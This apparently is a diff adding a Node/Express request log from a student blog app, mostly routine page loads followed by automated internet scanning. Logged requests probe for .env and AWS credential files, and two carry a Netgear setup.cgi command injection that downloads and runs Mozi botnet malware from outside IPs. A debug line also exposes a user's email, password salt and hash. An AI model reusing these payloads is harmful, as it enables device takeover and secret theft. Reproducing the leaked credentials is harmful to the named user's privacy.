+[0mGET /lib/angular.min.js [36m304 [0m0.504 ms - -[0m
+[0mGET /lib/angular-route.min.js [36m304 [0m0.389 ms - -[0m
+[0mGET /stylesheets/style.css [36m304 [0m0.323 ms - -[0m
+[0mGET /js/bloggerApp.js [36m304 [0m1.856 ms - -[0m
+[0mGET /bootstrap/css/bootstrap.min.css [36m304 [0m2.449 ms - -[0m
+[0mGET /css/bootstrap.min.css [36m304 [0m0.930 ms - -[0m
+[0mGET /css/all.min.css [36m304 [0m2.517 ms - -[0m
+[0mGET /auth/authentication.js [36m304 [0m0.470 ms - -[0m
+[0mGET /nav/navigation.js [36m304 [0m0.557 ms - -[0m
+[0mGET /nav/navigation.html [36m304 [0m0.496 ms - -[0m
+[
+  {
+    _id: new ObjectId('65f71ab0793344b6ec9a4793'),
+    title: 'Test',
+    text: 'Does it work?',
+    createdOn: 2024-03-17T16:30:40.544Z,
+    __v: 0
+  },
+  {
+    _id: new ObjectId('66082a57a81badbb4c769bab'),
+    title: 'Prof test 2',
+    text: 'Great job!',
+    createdOn: 2024-03-30T15:05:59.278Z,
+    __v: 0
+  }
+]
+[0mGET /api/blogs [36m304 [0m2.371 ms - -[0m
+[0mGET /favicon.ico [36m304 [0m0.732 ms - -[0m
+[0mGET /auth/login.view.html [36m304 [0m0.876 ms - -[0m
+[0mGET /favicon.ico [36m304 [0m1.549 ms - -[0m
+Login request received: inrapant@millersville.edu
+Passport authentication result: null {
+  _id: new ObjectId('65fb0e8709f3f542cfd2c539'),
+  name: 'Ilynd Rapant',
+  email: 'inrapant@millersville.edu',
+  salt: '8a585db66d3a9fc1ca4ef5fe9f96c99e',
+  hash: 'h1pvILT3xit+n4fEBP0v4SVKdEkkbZCreKdjQ5aWK3ibzuXgTQi6hjCF1TbgJKFxtGa+daG3YPELSAc97ZVWFA==',
+  __v: 0
+} undefined
+[0mPOST /api/login [32m200 [0m22.234 ms - 261[0m
+[
+  {
+    _id: new ObjectId('65f71ab0793344b6ec9a4793'),
+    title: 'Test',
+    text: 'Does it work?',
+    createdOn: 2024-03-17T16:30:40.544Z,
+    __v: 0
+  },
+  {
+    _id: new ObjectId('66082a57a81badbb4c769bab'),
+    title: 'Prof test 2',
+    text: 'Great job!',
+    createdOn: 2024-03-30T15:05:59.278Z,
+    __v: 0
+  }
+]
+[0mGET /api/blogs [36m304 [0m2.331 ms - -[0m
+[0mGET /favicon.ico [36m304 [0m0.535 ms - -[0m
+[0mGET /.env [32m200 [0m0.893 ms - 4749[0m
+[0mPOST / [32m200 [0m1.040 ms - 4749[0m
+[0mGET /.env [32m200 [0m0.895 ms - 4749[0m
+[0mPOST / [32m200 [0m0.836 ms - 4749[0m
+[0mGET /.env [32m200 [0m0.876 ms - 4749[0m
+[0mPOST / [32m200 [0m1.347 ms - 4749[0m
+[0mGET / [32m200 [0m1.017 ms - 4749[0m
+[0mGET / [32m200 [0m0.922 ms - 4749[0m
+[0mGET /nav/navigation.html [36m304 [0m0.443 ms - -[0m
+[0mGET / [32m200 [0m0.763 ms - 4749[0m
+[0mGET /lib/angular.min.js [36m304 [0m0.648 ms - -[0m
+[0mGET /lib/angular-route.min.js [36m304 [0m1.072 ms - -[0m
+[0mGET /bootstrap/css/bootstrap.min.css [36m304 [0m1.833 ms - -[0m
+[0mGET /js/bloggerApp.js [36m304 [0m3.249 ms - -[0m
+[0mGET /css/bootstrap.min.css [36m304 [0m2.396 ms - -[0m
+[0mGET /stylesheets/style.css [36m304 [0m0.614 ms - -[0m
+[0mGET /css/all.min.css [36m304 [0m3.411 ms - -[0m
+[0mGET /nav/navigation.js [36m304 [0m0.515 ms - -[0m
+[0mGET /auth/authentication.js [36m304 [0m0.483 ms - -[0m
+[0mGET /nav/navigation.html [36m304 [0m0.510 ms - -[0m
+[
+  {
+    _id: new ObjectId('65f71ab0793344b6ec9a4793'),
+    title: 'Test',
+    text: 'Does it work?',
+    createdOn: 2024-03-17T16:30:40.544Z,
+    __v: 0
+  },
+  {
+    _id: new ObjectId('66082a57a81badbb4c769bab'),
+    title: 'Prof test 2',
+    text: 'Great job!',
+    createdOn: 2024-03-30T15:05:59.278Z,
+    __v: 0
+  }
+]
+[0mGET /api/blogs [36m304 [0m3.254 ms - -[0m
+[0mGET /favicon.ico [36m304 [0m1.481 ms - -[0m
+[0mGET /.env [32m200 [0m0.975 ms - 4749[0m
+[0mPOST / [32m200 [0m0.850 ms - 4749[0m
+[0mGET /.env [32m200 [0m0.827 ms - 4749[0m
+[0mPOST / [32m200 [0m0.904 ms - 4749[0m
+[0mGET / [32m200 [0m0.708 ms - 4749[0m
+[0mGET / [32m200 [0m0.727 ms - 4749[0m
+[0mGET /.env [32m200 [0m0.894 ms - 4749[0m
+[0mPOST / [32m200 [0m1.500 ms - 4749[0m
+[0mGET / [32m200 [0m0.771 ms - 4749[0m
+[0mGET / [32m200 [0m1.834 ms - 4749[0m
+[0mGET /.env [32m200 [0m1.623 ms - 4749[0m
+[0mPOST / [32m200 [0m665.121 ms - 4749[0m
+[0mGET /.env [32m200 [0m1.565 ms - 4749[0m
+[0mPOST / [32m200 [0m1.008 ms - 4749[0m
+[0mGET /.env [32m200 [0m0.863 ms - 4749[0m
+[0mPOST / [32m200 [0m0.932 ms - 4749[0m
+[0mGET / [32m200 [0m1.102 ms - 4749[0m
+[0mGET / [32m200 [0m0.791 ms - 4749[0m
+[0mGET / [32m200 [0m0.687 ms - 4749[0m
+[0mGET /.env [32m200 [0m0.923 ms - 4749[0m
+[0mPOST / [32m200 [0m0.871 ms - 4749[0m
+[0mGET / [32m200 [0m0.751 ms - 4749[0m
+[0mGET / [32m200 [0m0.762 ms - 4749[0m
+[0mGET /.env [32m200 [0m0.838 ms - 4749[0m
+[0mPOST / [32m200 [0m0.772 ms - 4749[0m
+[0mGET / [32m200 [0m0.752 ms - 4749[0m
+[0mGET / [32m200 [0m0.821 ms - 4749[0m
+[0mGET / [32m200 [0m0.577 ms - 4749[0m
+[0mGET /.env [32m200 [0m0.898 ms - 4749[0m
+[0mPOST / [32m200 [0m0.853 ms - 4749[0m
+[0mGET / [32m200 [0m0.718 ms - 4749[0m
+[0mGET /.env [32m200 [0m0.915 ms - 4749[0m
+[0mPOST / [32m200 [0m0.877 ms - 4749[0m
+[0mGET / [32m200 [0m0.704 ms - 4749[0m
+[0mGET / [32m200 [0m0.684 ms - 4749[0m
+[0mHEAD / [32m200 [0m0.446 ms - 4749[0m
+[0mGET / [32m200 [0m0.863 ms - 4749[0m
+[0mGET / [32m200 [0m0.752 ms - 4749[0m
+[0mGET /.env [32m200 [0m0.895 ms - 4749[0m
+[0mPOST / [32m200 [0m1.061 ms - 4749[0m
+[0mGET /.env [32m200 [0m0.930 ms - 4749[0m
+[0mPOST / [32m200 [0m1.013 ms - 4749[0m
+[0mGET /.env [32m200 [0m1.212 ms - 4749[0m
+[0mPOST / [32m200 [0m495.359 ms - 4749[0m
+[0mGET / [32m200 [0m0.672 ms - 4749[0m
+[0mGET /js/bloggerApp.js [32m200 [0m0.770 ms - 5392[0m
+[0mGET / [32m200 [0m1.395 ms - 4749[0m
+[0mGET /favicon.ico [32m200 [0m0.941 ms - 4749[0m
+[0mGET /.env [32m200 [0m1.588 ms - 4749[0m
+[0mPOST / [32m200 [0m0.839 ms - 4749[0m
+[0mGET / [32m200 [0m0.732 ms - 4749[0m
+[0mGET / [32m200 [0m0.686 ms - 4749[0m
+[0mGET /favicon.ico [32m200 [0m1.992 ms - 4749[0m
+[0mGET /.env [32m200 [0m0.849 ms - 4749[0m
+[0mPOST / [32m200 [0m0.988 ms - 4749[0m
+[0mGET / [32m200 [0m0.860 ms - 4749[0m
+[0mGET /.env [32m200 [0m2.996 ms - 4749[0m
+[0mPOST / [32m200 [0m0.933 ms - 4749[0m
+[0mGET /phpinfo.php [32m200 [0m1.840 ms - 4749[0m
+[0mGET /info.php [32m200 [0m0.889 ms - 4749[0m
+[0mGET /phpinfo [32m200 [0m0.898 ms - 4749[0m
+[0mGET /php.php [32m200 [0m0.816 ms - 4749[0m
+[0mGET /php_info.php [32m200 [0m1.367 ms - 4749[0m
+[0mGET /phptest.php [32m200 [0m0.818 ms - 4749[0m
+[0mGET /dashboard/phpinfo.php [32m200 [0m0.811 ms - 4749[0m
+[0mGET /infophp.php [32m200 [0m2.139 ms - 4749[0m
+[0mGET /p.php [32m200 [0m1.053 ms - 4749[0m
+[0mGET /_profiler/phpinfo [32m200 [0m0.968 ms - 4749[0m
+[0mGET /info.php [32m200 [0m2.037 ms - 4749[0m
+[0mGET /pinfo.php [32m200 [0m1.148 ms - 4749[0m
+[0mGET /scripts/phpinfo.php [32m200 [0m0.959 ms - 4749[0m
+[0mGET /phpinfo.php [32m200 [0m0.899 ms - 4749[0m
+[0mGET /admin/phpinfo.php [32m200 [0m1.049 ms - 4749[0m
+[0mGET /phpinfo/phpinfo.php [32m200 [0m0.857 ms - 4749[0m
+[0mGET /information.php [32m200 [0m1.998 ms - 4749[0m
+[0mGET /information [32m200 [0m8.130 ms - 4749[0m
+[0mGET /phpinformation [32m200 [0m1.065 ms - 4749[0m
+[0mGET /php-info.php [32m200 [0m0.896 ms - 4749[0m
+[0mGET /phpversion.php [32m200 [0m3.473 ms - 4749[0m
+[0mGET /webdav/phpinfo.php [32m200 [0m1.021 ms - 4749[0m
+[0mGET /webdav/phpinfo [32m200 [0m0.853 ms - 4749[0m
+[0mGET /webdav/info.php [32m200 [0m0.996 ms - 4749[0m
+[0mGET /testphpinfo.php [32m200 [0m0.977 ms - 4749[0m
+[0mGET /testphpinfo [32m200 [0m0.791 ms - 4749[0m
+[0mGET /admin.php [32m200 [0m0.994 ms - 4749[0m
+[0mGET /_phpinfo.php [32m200 [0m1.573 ms - 4749[0m
+[0mGET /PHPConf.php [32m200 [0m0.851 ms - 4749[0m
+[0mGET /viewinfo.php [32m200 [0m0.755 ms - 4749[0m
+[0mGET /info/phpinfo.php [32m200 [0m0.849 ms - 4749[0m
+[0mGET /info/info.php [32m200 [0m0.792 ms - 4749[0m
+[0mGET /.env [32m200 [0m0.767 ms - 4749[0m
+[0mGET /.env.save [32m200 [0m0.806 ms - 4749[0m
+[0mGET /.env.old [32m200 [0m1.901 ms - 4749[0m
+[0mGET /.env.prod [32m200 [0m1.088 ms - 4749[0m
+[0mGET /.env.production [32m200 [0m1.185 ms - 4749[0m
+[0mGET /.env.development [32m200 [0m1.067 ms - 4749[0m
+[0mGET /laravel/.env [32m200 [0m3.695 ms - 4749[0m
+[0mGET /admin-app/.env [32m200 [0m2.368 ms - 4749[0m
+[0mGET /api/.env [32m200 [0m0.753 ms - 4749[0m
+[0mGET /app/.env [32m200 [0m0.846 ms - 4749[0m
+[0mGET /development/.env [32m200 [0m4.801 ms - 4749[0m
+[0mGET /apps/.env [32m200 [0m0.977 ms - 4749[0m
+[0mGET /.aws/credentials [32m200 [0m1.560 ms - 4749[0m
+[0mGET /private/.env [32m200 [0m0.854 ms - 4749[0m
+[0mGET /system/.env [32m200 [0m0.891 ms - 4749[0m
+[0mGET /docker/.env [32m200 [0m1.362 ms - 4749[0m
+[0mGET /cms/.env [32m200 [0m3.298 ms - 4749[0m
+[0mGET /script/.env [32m200 [0m1.104 ms - 4749[0m
+[0mGET /live_env [32m200 [0m4.690 ms - 4749[0m
+[0mGET /application/.env [32m200 [0m0.824 ms - 4749[0m
+[0mGET /.env.project [32m200 [0m1.136 ms - 4749[0m
+[0mGET /.env.dist [32m200 [0m0.744 ms - 4749[0m
+[0mGET /back/.env [32m200 [0m0.765 ms - 4749[0m
+[0mGET /core/.env [32m200 [0m0.878 ms - 4749[0m
+[0mGET /docker/.env [32m200 [0m0.894 ms - 4749[0m
+[0mGET /.env.new [32m200 [0m0.839 ms - 4749[0m
+[0mGET /local/.env [32m200 [0m1.367 ms - 4749[0m
+[0mGET /rest/.env [32m200 [0m0.726 ms - 4749[0m
+[0mGET /shared/.env [32m200 [0m0.725 ms - 4749[0m
+[0mGET /sources/.env [32m200 [0m0.874 ms - 4749[0m
+[0mGET /enviroments/.env.production [32m200 [0m0.808 ms - 4749[0m
+[0mGET /enviroments/.env [32m200 [0m0.724 ms - 4749[0m
+[0mGET / [32m200 [0m0.956 ms - 4749[0m
+[0mGET /favicon.ico [32m200 [0m0.841 ms - 4749[0m
+[0mGET /geoserver/web/ [32m200 [0m1.052 ms - 4749[0m
+[0mHEAD /Core/Skin/Login.aspx [32m200 [0m0.712 ms - 4749[0m
+[0mGET /.env [32m200 [0m0.830 ms - 4749[0m
+[0mPOST / [32m200 [0m765.794 ms - 4749[0m
+[0mGET /.env [32m200 [0m0.813 ms - 4749[0m
+[0mPOST / [32m200 [0m0.738 ms - 4749[0m
+[0mGET / [32m200 [0m0.713 ms - 4749[0m
+[0mHEAD /axis-cgi/mjpg/video.cgi [32m200 [0m1.169 ms - 4749[0m
+[0mHEAD /mjpg/1/video.mjpg [32m200 [0m1.371 ms - 4749[0m
+[0mHEAD /img/video.mjpeg [32m200 [0m0.944 ms - 4749[0m
+[0mHEAD /nphMotionJpeg?Resolution=640x480 [32m200 [0m0.836 ms - 4749[0m
+[0mHEAD /cgi-bin/faststream.jpg [32m200 [0m0.807 ms - 4749[0m
+[0mHEAD /nph-mjpeg.cgi [32m200 [0m0.733 ms - 4749[0m
+[0mGET / [32m200 [0m0.724 ms - 4749[0m
+[0mGET / [32m200 [0m2.542 ms - 4749[0m
+[0mGET / [32m200 [0m0.776 ms - 4749[0m
+[0mGET /favicon.ico [32m200 [0m0.909 ms - 4749[0m
+[0mHEAD / [32m200 [0m0.434 ms - 4749[0m
+[0mHEAD /Core/Skin/Login.aspx [32m200 [0m0.772 ms - 4749[0m
+[0mGET /.env [32m200 [0m0.868 ms - 4749[0m
+[0mPOST / [32m200 [0m113.073 ms - 4749[0m
+[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://37.135.72.4:40741/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 [32m200 [0m1.056 ms - 4749[0m
+[0mGET / [32m200 [0m0.703 ms - 4749[0m
+[0mPOST /HNAP1/ [32m200 [0m0.804 ms - 4749[0m
+[0mGET /.env [32m200 [0m0.874 ms - 4749[0m
+[0mPOST / [32m200 [0m0.776 ms - 4749[0m
+[0mHEAD /Core/Skin/Login.aspx [32m200 [0m0.624 ms - 4749[0m
+[0mGET /.env [32m200 [0m0.827 ms - 4749[0m
+[0mPOST / [32m200 [0m1.184 ms - 4749[0m
+[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://117.211.209.223:48829/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 [32m200 [0m1.030 ms - 4749[0m
+[0mGET / [32m200 [0m0.745 ms - 4749[0m
+[0mGET /favicon.ico [32m200 [0m0.842 ms - 4749[0m
+[0mGET /.env [32m200 [0m0.814 ms - 4749[0m
+[0mPOST / [32m200 [0m1.300 ms - 4749[0m
+[0mHEAD /Core/Skin/Login.aspx [32m200 [0m0.911 ms - 4749[0m
+[0mGET /.env [32m200 [0m0.971 ms - 4749[0m
+[0mPOST / [32m200 [0m1.205 ms - 4749[0m
+[0mGET /.env [32m200 [0m0.781 ms - 4749[0m
+[0mGET / [32m200 [0m0.728 ms - 4749[0m
+[0mGET / [32m200 [0m0.872 ms - 4749[0m
+[0mGET /.env [32m200 [0m0.810 ms - 4749[0m
+[0mPOST / [32m200 [0m0.841 ms - 4749[0m
+[0mGET /.env [32m200 [0m1.074 ms - 4749[0m
+[0mHEAD /Core/Skin/Login.aspx [32m200 [0m0.660 ms - 4749[0m
+[0mGET / [32m200 [0m0.730 ms - 4749[0m
+[0mGET /manager/html [32m200 [0m0.888 ms - 4749[0m
+[0mGET / [32m200 [0m0.790 ms - 4749[0m
+[0mGET / [32m200 [0m0.793 ms - 4749[0m
+[0mGET /favicon.ico [32m200 [0m1.030 ms - 4749[0m
+[0mHEAD /Core/Skin/Login.aspx [32m200 [0m0.748 ms - 4749[0m
+[0mGET /.env [32m200 [0m0.803 ms - 4749[0m
+[0mPOST / [32m200 [0m0.846 ms - 4749[0m
